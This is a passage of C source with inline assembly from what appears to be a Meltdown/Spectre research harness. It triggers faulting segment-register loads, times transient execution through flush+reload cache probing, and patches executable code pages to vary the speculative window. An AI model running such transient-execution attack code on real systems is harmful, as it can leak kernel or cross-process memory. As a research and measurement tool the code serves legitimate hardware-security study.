		code_len = (size_t)branch_meltdown_segment_ds_write_end - (size_t)branch_meltdown_segment_ds_write_begin;
		break;
		default:
		break;
	}

	if (code_len != 0)
		memcpy(code_seq_addr, (void *)base_addr, code_len);
}

int readMemoryByte(size_t training_x, size_t malicious_x, int score[2], uint8_t value[2], 
	size_t tlb_preload_x, int cache_level, int tlb_flush, int expected_data, size_t *code_seq_addr) {
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t read_x, dummy_x;
	volatile uint8_t * addr;
	unsigned status;
	int count[3] = {0, 0, 0};

	if (code_seq_addr != NULL) {
		extern const char BRANCH_CODE_SEQUENCE[];
		*code_seq_addr = (size_t)BRANCH_CODE_SEQUENCE;
		return -1;
	}

	for (i = 0; i < 256; i++)
		results[i] = 0;

	for (i = 0; i < 256; i++)
		flush(mem + i * 0x1000); /* intrinsic for clflush instruction */

	for (j = config.retries; j > 0; j--) {
		*xp = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
		*xp = (*xp | (*xp >> 16)); /* Set x=-1 if j&6=0, else x=0 */
		read_x = (~*xp & training_x) | (*xp & malicious_x) + (~*xp & 0x208);
		dummy_x = (0x200 & *xp) | (~*xp & 0x800);


		if (to_modify_ldt == 1)
			libkdump_segment_prepare();
		else if (to_modify_ldt == 2)
			libkdump_segment_ro_prepare();
		else if (to_modify_ldt == 3)
			libkdump_segment_xo_prepare();
		else if (to_modify_ldt == 6)
			libkdump_segment_np_prepare();

		flush(xp);
		flush(xp1);
		flush(xp2);
		flush(xp3);
		flush(xp4);
		libkdump_flush_tlb_all();
		// maccess((void *)tlb_preload_x);

		libkdump_prepare_data_condition(training_x, cache_level, tlb_flush);

		// asm volatile("cpuid":::"eax", "ebx", "ecx", "edx");

		// option 1: conditional branch
		// if ((status = _xbegin()) == _XBEGIN_STARTED) {
		// __asm__ volatile (
		//   "mov %3, %%edx\n\t"
		//   // "clflush (%%edx)\n\t"
		//   "movq (%%edx), %%edx\n\t"
		//   "mov %1, %%eax\n\t"
		//   // "clflush (%%eax)\n\t"
		//   "mov %2, %%ecx\n\t"
		//   "mfence\n\t"
		//   // "mov (%%ecx), %%rax\n\t" // this instruction is not necessary; the only purpose is to put secret in cache
		//   "mov %0, %%ebx\n\t"
		//   "mov $0x0, %%edx\n\t"

		//   "movq (%%eax), %%eax\n\t"
		//   "movq (%%eax), %%eax\n\t"
		//   "movq (%%eax), %%eax\n\t"
		//   "movq (%%eax), %%eax\n\t"
		//   "cmp (%%eax), %%edx\n\t"
		//   "jne TO_ADDR_END\n\t"
		//   "TO_ADDR: movq (%%ecx), %%ecx\n\t"
		//   "movq (%%ebx, %%ecx, 1), %%ecx\n\t"
		//   "movq (%%ebx, %%rdx, 1), %%rdx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   // "add $1, %%ecx\n\t"
		//   // "sub $1, %%ecx\n\t"
		//   "TO_ADDR_END: nop\n\t"
		//   :
		//   : "r" (array2), "r" (xp4), "r" (read_x), "r" (training_x), "d" (dummy_x)
		//   : "edx", "eax", "%ebx", "%ecx"
		// );
		// _xend();
		// }

		// option 2: exception after exception
		if (!setjmp(buf)) {
			__asm__ volatile (
			// "mov %3, %%edx\n\t"
			// // "clflush (%%edx)\n\t"
			// "movq (%%edx), %%edx\n\t"
			// "mov %1, %%eax\n\t"
			// // "clflush (%%eax)\n\t"
			// "mov %2, %%ecx\n\t"
			// // "mov (%%ecx), %%rax\n\t" // this instruction is not necessary; the only purpose is to put secret in cache
			// "mov %0, %%ebx\n\t"
			// "mfence\n\t"
				"movl $0x1, %%eax\n\t"
				"movl $0x7, %%edx\n\t"
				"movl %%edx, %%ds\n\t"
				"mfence\n\t"

				// "movl %%es:(%%eax), %%eax\n\t"
				// "movl %%es:(%%eax), %%eax\n\t"
				// "movl %%es:(%%eax), %%eax\n\t"
				// "movl %%es:(%%eax), %%eax\n\t"
				"movl %%es:(%%eax), %%eax\n\t" // last movq is illegal
				"BRANCH_CODE_SEQUENCE:\n\t"
				"TO_ADDR: movl %%es:(%%ecx), %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"movl %%es:(%%ebx, %%ecx, 1), %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"add $1, %%ecx\n\t"
				"sub $1, %%ecx\n\t"
				"TO_ADDR_END: nop\n\t"
				:
				: "b" (mem), "a" (xp), "c" (malicious_x)
				: "edx"
				);
		}

		// option 3: retpoline
		// __asm__ volatile (
		//   // "mov %3, %%edx\n\t"
		//   // "clflush (%%edx)\n\t"
		//   // "movl (%%edx), %%edx\n\t"
		//   // "mov %1, %%eax\n\t"
		//   // "clflush (%%eax)\n\t"
		//   // "mov %2, %%ecx\n\t"
		//   // "mov (%%ecx), %%rax\n\t" // this instruction is not necessary; the only purpose is to put secret in cache
		//   // "mov %0, %%ebx\n\t"
		//   "movl $0x2b, %%edx\n\t"
		//   "movl %%edx, %%ds\n\t"
		//   "mfence\n\t"

		//   "call set_up_target\n\t"
		//   "movl (%%ecx), %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "movl (%%ebx, %%ecx, 1), %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "sub $1, %%ecx\n\t"
		//   "add $1, %%ecx\n\t"
		//   "movl (%%eax), %%ecx\n\t"
		//   "capture: pause\n\t"
		//   "jmp capture\n\t"
		//   "set_up_target: lea destination, %%edx\n\t"
		//   "movl %%edx, %%es:(%%esp)\n\t"
		//   "clflush %%es:(%%esp)\n\t"
		//   "mfence\n\t"
		//   "ret\n\t"
		//   "destination: nop\n\t"
		//   "movl $0x2b, %%edx\n\t"
		//   "movl %%edx, %%ss\n\t"
		//   "movl %%edx, %%ds\n\t"
		//   :
		//   : "b" (mem), "a" (xp), "c" (malicious_x)
		//   : "edx"
		// );
		// }

		// if (to_backup_stack)
		//     restore_stack();

		// mix_i = 0x0;
		// if (flush_reload(mem + mix_i * 0x1000))
		//     count[1]++; /* cache hit - add +1 to score for this value */

		mix_i = expected_data;
		if (flush_reload(mem + mix_i * 0x1000))
				count[0]++; /* cache hit - add +1 to score for this value */
		// }
	}

	printf("0x%x: %d\n", expected_data, count[0]);
	if (expected_data != 0) {
		value[0] = (uint8_t)expected_data;
		score[0] += count[0];
	} else {
		value[1] = (uint8_t)0x0;
		score[1] += count[0];
	}

	if (count[0] < (config.retries/100) && count[1] < (config.retries/100))
		return -1;
	else
		return (count[0] >= count[1]) ? expected_data : 0x0;
}

void libkdump_spectre_prepare(size_t code_addr, size_t code_len) {
	int i;

	xp = (size_t *)malloc(0x5000);
	printf("xp @%p\n", xp);
	*xp = 0;
	xp1 = xp + 0x1000/sizeof(size_t);
	*xp1 = (size_t)xp;
	printf("xp1 @%p -> %x\n", xp1, *xp1);
	xp2 = xp1 + 0x1000/sizeof(size_t);
	*xp2 = (size_t)xp1;
	printf("xp2 @%p -> %x\n", xp2, *xp2);
	xp3 = xp2 + 0x1000/sizeof(size_t);
	*xp3 = (size_t)xp2;
	printf("xp3 @%p -> %x\n", xp3, *xp3);
	xp4 = xp3 + 0x1000/sizeof(size_t);
	*xp4 = (size_t)xp3;
	printf("xp4 @%p -> %x\n", xp4, *xp4);
}

void libkdump_spectre_result(int score[2], uint8_t value[2]) {
	printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
	printf("0x%02X=’%c’ score=%d ", value[0],
		(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);

	if (score[1] > 0) {
		printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
			(value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
	}

	printf("\n");
}

int libkdump_spectre_read(size_t training_x, size_t malicious_x, int score[2], 
	uint8_t value[2], size_t tlb_preload_x, int code_type, int cache_level, int tlb_flush, int expected_data) {
	int i, j, r;
	int count[MAX_MEASUREMENT];
	for (i = 0; i < MAX_MEASUREMENT; i++)
		count[i] = -1;

	phys = malicious_x;
	legal = training_x;
	size_t code_seq_addr = 0;
	readMemoryByte(0, 0, 0, 0, 0, 0, 0, 0, &code_seq_addr);
	printf("code_seq_addr: 0x%x\n", code_seq_addr);
	assert(mprotect((void *)((code_seq_addr >> 12) << 12), 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC) == 0);
	// should fix this function (a new function copying new instruction sequences, other than framework #1)
	libkdump_select_branch_code_sequence(code_type, (void *)code_seq_addr);

	if (code_type == MELTDOWN_XMM)
		libkdump_xmm_prepare(malicious_x, 0);
	else if (code_type == MELTDOWN_BOUND)
		libkdump_bound_prepare();
	else if (code_type == MELTDOWN_SEGMENT_DS || code_type == MELTDOWN_SEGMENT_SS || code_type == MELTDOWN_SEGMENT_STANDARD)
	// wait until running test code to avoid exceptions during preparation
	// libkdump_segment_prepare();
		to_modify_ldt = 1;
	else if (code_type == MELTDOWN_SEGMENT_DS_RO || MELTDOWN_SEGMENT_SS_RO)
		to_modify_ldt = 2;
	else if (code_type == MELTDOWN_SEGMENT_CS_XO)
		to_modify_ldt = 3;
	else if (code_type == MELTDOWN_SEGMENT_DS_NULL || code_type == MELTDOWN_SEGMENT_SS_NULL)
		to_modify_ldt = 4;
	else if (code_type == MELTDOWN_SEGMENT_DS_PRIVILEGE || code_type == MELTDOWN_SEGMENT_SS_PRIVILEGE)
		to_modify_ldt = 5;
	else if (code_type == MELTDOWN_SEGMENT_DS_NP || code_type == MELTDOWN_SEGMENT_SS_NP)
		to_modify_ldt = 6;

	if (to_modify_ldt && (code_type % 2 == 0))
		to_backup_stack = 1;

	for (i = 0; i < config.measurements && i < MAX_MEASUREMENT; i++) {
		for (j = 0; j < MAX_WINDOW_SIZE; j++) {
			printf("try %d\n", j);
			r = readMemoryByte(training_x, malicious_x, score, value, 
				tlb_preload_x, cache_level, tlb_flush, expected_data, NULL);

			if (r >= 0) {
				libkdump_insert_speculative_instruction(code_type, j+1, (void *)code_seq_addr);
			}
			else {
				count[i] = j;
				break;
			}
		}
	}

	if (1) {
		to_modify_ldt = 0;
		to_backup_stack = 0;
	}

	for (i = 0; i < MAX_MEASUREMENT; i++) {
		if (count[i] >= 0)
			printf("%d count %d\n", i, count[i]);
	}
}
